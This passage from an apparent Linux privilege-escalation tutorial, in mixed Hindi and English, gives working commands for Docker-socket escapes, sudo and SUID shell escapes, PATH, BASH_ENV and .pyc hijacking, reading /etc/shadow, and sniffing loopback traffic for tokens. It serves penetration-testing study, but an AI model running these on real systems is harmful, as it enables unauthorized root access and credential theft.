- कोई systemd unit ढूंढें जो **relative path execute** कर रहा हो और आपके पास **systemd PATH** पर **writable privileges** हों (**उस executable को impersonate** करने के लिए)

**timers के बारे में और जानें: `man systemd.timer`.**

### **Enabling Timer**

Timer enable करने के लिए आपको root privileges चाहिए और यह execute करना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
ध्यान दें कि **timer** को `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर इसका symlink बनाकर **activate** किया जाता है

## Sockets

Unix Domain Sockets (UDS) same या different machines पर client-server models के भीतर **process communication** enable करते हैं। ये inter-computer communication के लिए standard Unix descriptor files का उपयोग करते हैं और `.socket` files के जरिए set up किए जाते हैं।

Sockets को `.socket` files का उपयोग करके configure किया जा सकता है।

**`man systemd.socket` के साथ sockets के बारे में अधिक जानें।** इस file के अंदर, कई interesting parameters configure किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये options अलग-अलग हैं, लेकिन एक summary का उपयोग यह **indicate करने** के लिए किया जाता है कि socket कहाँ listen करेगा (AF_UNIX socket file का path, listen करने के लिए IPv4/6 और/या port number, आदि.)
- `Accept`: एक boolean argument लेता है। अगर **true** है, तो हर incoming connection के लिए एक **service instance is spawned** होती है और केवल connection socket उसे पास किया जाता है। अगर **false** है, तो सभी listening sockets खुद **started service unit** को पास किए जाते हैं, और सभी connections के लिए केवल एक service unit spawn होती है। यह value datagram sockets और FIFOs के लिए ignore की जाती है जहाँ एक single service unit बिना शर्त सभी incoming traffic को handle करती है। **Defaults to false**. Performance कारणों से, new daemons को केवल इस तरह लिखना recommended है जो `Accept=no` के लिए suitable हो।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेता है, जो listening **sockets**/FIFOs के **created** और bound होने से पहले या बाद में, क्रमशः, **executed** होती हैं। command line का पहला token एक absolute filename होना चाहिए, फिर उसके बाद process के लिए arguments।
- `ExecStopPre`, `ExecStopPost`: Additional **commands** जो listening **sockets**/FIFOs के **closed** और removed होने से पहले या बाद में, क्रमशः, **executed** होती हैं।
- `Service`: incoming traffic पर **activate** होने वाली **service** unit का नाम specify करता है। यह setting केवल Accept=no वाले sockets के लिए allowed है। यह default रूप से उस service पर set होता है जिसका नाम socket के same name के साथ होता है (suffix replace करके)। ज्यादातर मामलों में, इस option का उपयोग करना जरूरी नहीं होना चाहिए।

### Writable .socket files

अगर आपको एक **writable** `.socket` file मिलती है, तो आप `[Socket]` section की शुरुआत में कुछ ऐसा **add** कर सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket बनने से पहले execute हो जाएगा। इसलिए, आपको **संभवतः machine के reboot होने तक इंतजार करना पड़ेगा।**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Socket activation + writable unit path (create missing service)

एक और high-impact misconfiguration है:

- एक socket unit with `Accept=no` और `Service=<name>.service`
- referenced service unit missing है
- attacker `/etc/systemd/system` (या किसी अन्य unit search path) में write कर सकता है

ऐसे में, attacker `<name>.service` create कर सकता है, फिर socket पर traffic trigger कर सकता है ताकि systemd new service को root के रूप में load और execute करे।

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable sockets

यदि आप **कोई भी writable socket पहचानते हैं** (_अब हम Unix Sockets की बात कर रहे हैं, config `.socket` files की नहीं_), तो **आप उस socket के साथ communication** कर सकते हैं और शायद किसी vulnerability का exploit कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Raw connection
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets HTTP** requests के लिए सुन रहे हो सकते हैं (_मैं .socket files की बात नहीं कर रहा हूँ, बल्कि उन files की जो unix sockets की तरह काम करती हैं_). आप इसे इस तरह check कर सकते हैं:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
यदि socket **HTTP** request के साथ **responds** करता है, तो आप उससे **communicate** कर सकते हैं और शायद किसी **vulnerability** का **exploit** कर सकते हैं।

### Writable Docker Socket

Docker socket, जो अक्सर `/var/run/docker.sock` पर मिलता है, एक critical file है जिसे secure किया जाना चाहिए। By default, यह `root` user और `docker` group के members द्वारा writable होता है। इस socket पर write access होना privilege escalation की ओर ले जा सकता है। नीचे बताया गया है कि यह कैसे किया जा सकता है और अगर Docker CLI available नहीं है तो alternative methods क्या हैं।

#### **Privilege Escalation with Docker CLI**

अगर आपके पास Docker socket पर write access है, तो आप निम्नलिखित commands का उपयोग करके privileges escalate कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड्स आपको host के file system तक root-level access के साथ एक container चलाने की अनुमति देते हैं।

#### **Using Docker API Directly**

ऐसे मामलों में जब Docker CLI उपलब्ध नहीं होता, Docker socket को फिर भी Docker API और `curl` commands का उपयोग करके manipulate किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की list retrieve करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** host system की root directory को mount करने वाला container create करने के लिए request भेजें।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नए बनाए गए container को start करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** container से connection establish करने के लिए `socat` का उपयोग करें, जिससे उसके भीतर command execution संभव हो सके।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` connection सेटअप करने के बाद, आप container में सीधे commands execute कर सकते हैं, host के filesystem तक root-level access के साथ।

### Others

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **docker group** के अंदर हैं, तो आपके पास [**privileges escalate करने के और तरीके**](interesting-groups-linux-pe/index.html#docker-group) हो सकते हैं। यदि [**docker API किसी port पर listening** है, तो आप उसे भी compromise कर सकते हैं](../../network-services-pentesting/2375-penting-docker.md#compromising)।

Check **container से बाहर निकलने या container runtimes का abuse करके privileges escalate करने के और तरीके** in:

{{#ref}}
container-security/
{{endref}}

## Containerd (ctr) privilege escalation

यदि आप **`ctr`** command का उपयोग कर सकते हैं, तो निम्न page पढ़ें क्योंकि **आप इसका abuse करके privileges escalate कर सकते हैं**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{endref}}

## **RunC** privilege escalation

यदि आप **`runc`** command का उपयोग कर सकते हैं, तो निम्न page पढ़ें क्योंकि **आप इसका abuse करके privileges escalate कर सकते हैं**:


{{#ref}}
runc-privilege-escalation.md
{{endref}}

## **D-Bus**

D-Bus एक sophisticated **inter-Process Communication (IPC) system** है जो applications को efficiently interact करने और data share करने में सक्षम बनाता है। आधुनिक Linux system को ध्यान में रखकर design किया गया यह system, अलग-अलग प्रकार की application communication के लिए एक robust framework प्रदान करता है।

यह system versatile है, और basic IPC को support करता है जो processes के बीच data exchange को बेहतर बनाता है, और **enhanced UNIX domain sockets** जैसा अनुभव देता है। इसके अलावा, यह events या signals broadcast करने में मदद करता है, जिससे system components के बीच seamless integration होती है। उदाहरण के लिए, Bluetooth daemon से आने वाली call के बारे में एक signal music player को mute करने के लिए prompt कर सकता है, जिससे user experience बेहतर होता है। साथ ही, D-Bus एक remote object system को support करता है, जो applications के बीच service requests और method invocations को सरल बनाता है, और traditionally complex रहे processes को streamline करता है।

D-Bus एक **allow/deny model** पर operate करता है, और message permissions (method calls, signal emissions, आदि) को matching policy rules के cumulative effect के आधार पर manage करता है। ये policies bus के साथ interactions को specify करती हैं, जिससे इन permissions के exploitation के जरिए privilege escalation संभव हो सकता है।

`/etc/dbus-1/system.d/wpa_supplicant.conf` में ऐसी policy का एक example दिया गया है, जो root user को `fi.w1.wpa_supplicant1` को own करने, उसे भेजने, और उससे messages receive करने की permissions detail से बताता है।

जिन policies में कोई specified user या group नहीं होता, वे universally apply होती हैं, जबकि "default" context policies उन सभी पर apply होती हैं जो अन्य specific policies में covered नहीं हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ D-Bus communication को enumerate और exploit करना सीखें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

यह हमेशा दिलचस्प होता है network को enumerate करना और machine की position पता लगाना।

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### आउटबाउंड फ़िल्टरिंग त्वरित triage

यदि host commands चला सकता है लेकिन callbacks fail हो रहे हैं, तो DNS, transport, proxy, और route filtering को जल्दी से अलग करें:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### खुले हुए ports

मशीन तक पहुँचने से पहले उन network services को हमेशा check करें जिनके साथ आप interact नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
बंधनों के target के आधार पर listeners को classify करें:

- `0.0.0.0` / `[::]`: सभी local interfaces पर exposed.
- `127.0.0.1` / `::1`: local-only (good tunnel/forward candidates).
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): usually reachable only from internal segments.

### Local-only service triage workflow

जब आप किसी host को compromise करते हैं, तो `127.0.0.1` पर bound services अक्सर पहली बार आपके shell से reachable हो जाती हैं. एक quick local workflow यह है:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### नेटवर्क स्कैनर के रूप में LinPEAS (network-only mode)

स्थानीय PE checks के अलावा, linPEAS एक focused network scanner के रूप में भी चल सकता है। यह `$PATH` में उपलब्ध binaries का उपयोग करता है (आमतौर पर `fping`, `ping`, `nc`, `ncat`) और कोई tooling install नहीं करता।
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
यदि आप `-t` के बिना `-d`, `-p`, या `-i` पास करते हैं, तो linPEAS एक शुद्ध नेटवर्क स्कैनर की तरह व्यवहार करता है (privilege-escalation checks के बाकी हिस्से को छोड़कर)।

### Sniffing

जांचें कि क्या आप traffic sniff कर सकते हैं। अगर कर सकते हैं, तो आप कुछ credentials पकड़ने में सक्षम हो सकते हैं।
```
timeout 1 tcpdump
```
त्वरित व्यावहारिक checks:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) विशेष रूप से post-exploitation में मूल्यवान है क्योंकि कई internal-only services वहाँ tokens/cookies/credentials expose करती हैं:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
अब कैप्चर करें, बाद में पार्स करें:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Generic Enumeration

Check **who** आप हैं, आपके पास कौन-से **privileges** हैं, सिस्टम में कौन-से **users** हैं, कौन **login** कर सकते हैं, और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux versions एक bug से प्रभावित थीं जो **UID > INT_MAX** वाले users को privileges escalate करने की अनुमति देता है। और जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**इसे exploit करें** using: **`systemd-run -t /bin/bash`**

### Groups

जांचें कि क्या आप किसी ऐसे group के **member** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

जांचें कि clipboard के अंदर कुछ interesting है या नहीं (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

यदि आप environment का **कोई भी password** जानते हैं, तो उसे इस्तेमाल करके **हर user** के रूप में login करने की कोशिश करें।

### Su Brute

यदि आपको बहुत noise करने में दिक्कत नहीं है और computer पर `su` और `timeout` binaries मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके user को brute-force करने की कोशिश कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ भी users को brute-force करने की कोशिश करता है।

## Writable PATH abuses

### $PATH

यदि आपको लगता है कि आप $PATH के किसी folder के अंदर **write** कर सकते हैं, तो आप **writable folder के अंदर एक backdoor बनाकर** privileges escalate कर सकते हैं, उस command के नाम से जो किसी दूसरे user (बेहतर होगा root) द्वारा execute की जाने वाली है और जो $PATH में आपके writable folder से पहले located किसी folder से load **नहीं** होती है।

### SUDO and SUID

आपको sudo का उपयोग करके कुछ command execute करने की अनुमति हो सकती है या उनके पास suid bit हो सकती है। इसे इस तरह check करें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **unexpected commands आपको files को read और/or write करने, या यहाँ तक कि command execute करने** की अनुमति देते हैं। उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration किसी user को password जाने बिना दूसरे user की privileges के साथ कुछ command execute करने की अनुमति दे सकती है.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `vim` को `root` के रूप में चला सकता है, अब root डायरेक्टरी में एक ssh key जोड़कर या `sh` को कॉल करके shell प्राप्त करना बहुत आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह directive उपयोगकर्ता को कुछ execute करते समय **एक environment variable set करने** की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer** पर आधारित, **vulnerable** था **PYTHONPATH hijacking** के लिए ताकि script को root के रूप में execute करते समय एक arbitrary python library load की जा सके:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

यदि कोई **sudo-allowed Python script** एक ऐसा module import करता है जिसके package directory में **writable `__pycache__`** है, तो आप cached `.pyc` को replace करके अगले import पर privileged user के रूप में code execution पा सकते हैं।

- यह क्यों काम करता है:
- CPython bytecode caches को `__pycache__/module.cpython-<ver>.pyc` में store करता है।
- Interpreter **header** की validation करता है (magic + source से tied timestamp/hash metadata), फिर उस header के बाद stored marshaled code object को execute करता है।
- अगर directory writable हो, तो आप cached file को **delete और recreate** कर सकते हैं, इसलिए root-owned लेकिन non-writable `.pyc` भी replace किया जा सकता है।
- Typical path:
- `sudo -l` एक Python script या wrapper दिखाता है जिसे आप root के रूप में चला सकते हैं।
- वह script `/opt/app/`, `/usr/local/lib/...`, आदि से local module import करती है।
- Imported module की `__pycache__` directory आपकी user या सभी के लिए writable होती है।

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
यदि आप privileged script का निरीक्षण कर सकते हैं, तो imported modules और उनका cache path पहचानें:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Abuse workflow:

1. sudo-allowed script को एक बार चलाएँ ताकि Python legit cache file बना दे, अगर वह पहले से मौजूद नहीं है।
2. legit `.pyc` से पहले 16 bytes पढ़ें और उन्हें poisoned file में reuse करें।
3. एक payload code object compile करें, `marshal.dumps(...)` करें, original cache file delete करें, और उसे original header plus आपकी malicious bytecode के साथ दोबारा create करें।
4. sudo-allowed script को फिर से चलाएँ ताकि import आपके payload को root के रूप में execute करे।

Important notes:

- Original header को reuse करना key है क्योंकि Python cache metadata को source file के against check करता है, यह नहीं कि bytecode body सच में source से match करती है या नहीं।
- यह खास तौर पर तब useful है जब source file root-owned हो और writable न हो, लेकिन containing `__pycache__` directory writable हो।
- Attack fail हो जाता है अगर privileged process `PYTHONDONTWRITEBYTECODE=1` use करता है, safe permissions वाली location से import करता है, या import path में हर directory से write access हटा देता है।

Minimal proof-of-concept shape:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- सुनिश्चित करें कि privileged Python import path में कोई भी directory low-privileged users के लिए writable न हो, जिसमें `__pycache__` भी शामिल है।
- Privileged runs के लिए `PYTHONDONTWRITEBYTECODE=1` और unexpected writable `__pycache__` directories की periodic checks पर विचार करें।
- Writable local Python modules और writable cache directories को उसी तरह treat करें जैसे writable shell scripts या shared libraries जिन्हें root execute करता है।

### BASH_ENV preserved via sudo env_keep → root shell

If sudoers `BASH_ENV` को preserve करता है (उदा. `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash के non-interactive startup behavior का उपयोग करके allowed command invoke करते समय root के रूप में arbitrary code run कर सकते हैं।

- Why it works: Non-interactive shells के लिए, Bash `$BASH_ENV` को evaluate करता है और target script चलाने से पहले उस file को source करता है। कई sudo rules किसी script या shell wrapper को run करने की अनुमति देते हैं। अगर `BASH_ENV` sudo द्वारा preserve होता है, तो आपकी file root privileges के साथ source होती है।

- Requirements:
- एक sudo rule जिसे आप run कर सकें (कोई भी target जो `/bin/bash` को non-interactively invoke करता हो, या कोई भी bash script)।
- `BASH_ENV` का `env_keep` में present होना ( `sudo -l` से check करें)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep` से `BASH_ENV` (और `ENV`) हटाएं, `env_reset` को प्राथमिकता दें।
- sudo-allowed commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- preserved env vars के उपयोग पर sudo I/O logging और alerting पर विचार करें।

### Terraform via sudo with preserved HOME (!env_reset)

अगर sudo environment को intact छोड़ता है (`!env_reset`) जबकि `terraform apply` की अनुमति देता है, तो `$HOME` calling user का ही रहता है। इसलिए Terraform root के रूप में **$HOME/.terraformrc** लोड करता है और `provider_installation.dev_overrides` को honor करता है।

- आवश्यक provider को writable directory की ओर point करें और provider के नाम वाला malicious plugin drop करें (e.g., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform Go plugin handshake में fail होगा, लेकिन मरने से पहले payload को root के रूप में execute करता है, और पीछे एक SUID shell छोड़ जाता है।

### TF_VAR overrides + symlink validation bypass

Terraform variables को `TF_VAR_<name>` environment variables के जरिए provide किया जा सकता है, जो तब भी survive करते हैं जब sudo environment को preserve करता है। कमजोर validations जैसे `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` को symlinks के साथ bypass किया जा सकता है:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform symlink को resolve करता है और असली `/root/root.txt` को attacker-readable destination में copy करता है। इसी approach का उपयोग privileged paths में **write** करने के लिए भी किया जा सकता है, destination symlinks को पहले से pre-create करके (जैसे provider के destination path को `/etc/cron.d/` के अंदर point करना)।

### requiretty / !requiretty

कुछ पुराने distributions पर, sudo को `requiretty` के साथ configure किया जा सकता है, जो sudo को केवल interactive TTY से run करने के लिए force करता है। अगर `!requiretty` set है (या option absent है), तो sudo को non-interactive contexts जैसे reverse shells, cron jobs, या scripts से execute किया जा सकता है।
```bash
Defaults !requiretty
```
यह अपने आप में कोई direct vulnerability नहीं है, लेकिन यह उन situations को बढ़ाता है जहाँ sudo rules का abuse full PTY की जरूरत के बिना किया जा सकता है।

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

अगर `sudo -l` में `env_keep+=PATH` दिखता है या `secure_path` में attacker-writable entries हैं (जैसे `/home/<user>/bin`), तो sudo-allowed target के अंदर कोई भी relative command shadow की जा सकती है।

- Requirements: एक sudo rule (अक्सर `NOPASSWD`) जो ऐसा script/binary चलाता हो जो commands को absolute paths के बिना call करता हो (`free`, `df`, `ps`, आदि) और एक writable PATH entry जो सबसे पहले search होती हो।
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo execution bypassing paths
**Jump** to read other files or use **symlinks**. For example in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### बिना command path के Sudo command/SUID binary

यदि **sudo permission** किसी एक command को **path निर्दिष्ट किए बिना** दी गई है: _hacker10 ALL= (root) less_ तो आप **PATH** variable बदलकर इसका exploit कर सकते हैं
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह technique तब भी इस्तेमाल की जा सकती है अगर कोई **suid** binary **किसी दूसरे command को उसके path के बिना execute करती है (हमेशा किसी weird SUID binary की content को _**strings**_ से check करें)**।

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

अगर **suid** binary **path specify करके किसी दूसरे command को execute करती है**, तो आप उसी command के नाम से एक **function export** करने की कोशिश कर सकते हैं जिसे suid file call कर रही है।

उदाहरण के लिए, अगर कोई suid binary _**/usr/sbin/service apache2 start**_ call करती है, तो आपको function create करके उसे export करने की कोशिश करनी होगी:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, जब आप suid binary को call करते हैं, यह function execute होगा

### Writable script executed by a SUID wrapper

A common custom-app misconfiguration is a root-owned SUID binary wrapper that executes a script, while the script itself is writable by low-priv users.

Typical pattern:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
यदि `/usr/local/bin/backup.sh` writable है, तो आप payload commands जोड़ सकते हैं और फिर SUID wrapper execute कर सकते हैं:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
त्वरित जाँचें:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
यह attack path विशेष रूप से `/usr/local/bin` में shipped होने वाले "maintenance"/"backup" wrappers में common है।

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so files) को specify करने के लिए किया जाता है, जिन्हें loader द्वारा बाकी सभी से पहले, standard C library (`libc.so`) सहित, load किया जाता है। इस process को library preloading कहा जाता है।

हालांकि, system security बनाए रखने और इस feature के exploit होने से रोकने के लिए, खासकर **suid/sgid** executables के साथ, system कुछ conditions enforce करता है:

- Loader उन executables के लिए **LD_PRELOAD** को disregard करता है जहाँ real user ID (_ruid_) effective user ID (_euid_) से match नहीं करता।
